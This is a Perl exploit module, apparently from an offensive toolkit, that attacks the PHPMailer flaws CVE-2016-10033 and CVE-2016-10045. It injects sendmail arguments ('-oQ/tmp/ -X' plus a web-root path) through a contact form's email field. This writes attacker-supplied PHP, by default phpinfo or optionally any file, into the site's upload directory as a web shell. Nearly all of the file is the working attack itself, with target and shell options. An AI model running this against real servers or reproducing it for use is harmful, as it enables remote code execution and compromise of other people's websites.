package Spellbook::Advisory::CVE_2016_10045 {
    use strict;
    use warnings;
    use Try::Tiny;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @results);
        
        my $dir   = '/var/www/html/uploads';
        my %shell = (
            'name' => 'spellbook_xpl.php',
            'code' => '<?php phpinfo(); ?>'
        );

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'        => \$help,
            't|target=s'    => \$target,
            'S|shell=s'     => \$shell{name},
            'd|directory=s' => \$dir
        );
        
        if ($target) {
            if ($target !~ /^http(s)?:\/\//x) { 
                $target = "https://$target";
            }

            my $userAgent = Spellbook::Core::UserAgent -> new();

            if ($shell{"name"} ne "spellbook_xpl.php") {
                my $code = Mojo::File -> new($shell{name});

                $shell{code} = $code -> slurp();
            }
            
            my $CVE_2016_10033 = "\"attacker\\\" -oQ/tmp/ -X$dir/$shell{name}  some\"\@email.com";
            my $CVE_2016_10045 = "\"attacker\\' -oQ/tmp/ -X$dir/$shell{name}  some\"\@email.com";
            
            try {
                my $request = $userAgent -> post($target, [
                    "action"  => "send",
                    "name"    => "Jas Fasola",
                    "subject" => "Lorem ipsum",
                    "email"   => $CVE_2016_10033,
                    "message" => $shell{code}
                ]);
            }

            catch {
                my $request = $userAgent -> post($target, [
                    "action"  => "send",
                    "name"    => "Jas Fasola",
                    "subject" => "Lorem ipsum",
                    "email"   => $CVE_2016_10045,
                    "message" => $shell{code}
                ]);
            };

            return @results;
        }

        if ($help) {
            return "
                \rExploit::CVE_2016_10045
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target
                \r-S, --shell    
                \r-d, --directory \n\n";
        }

        return 0;
    }
}

1;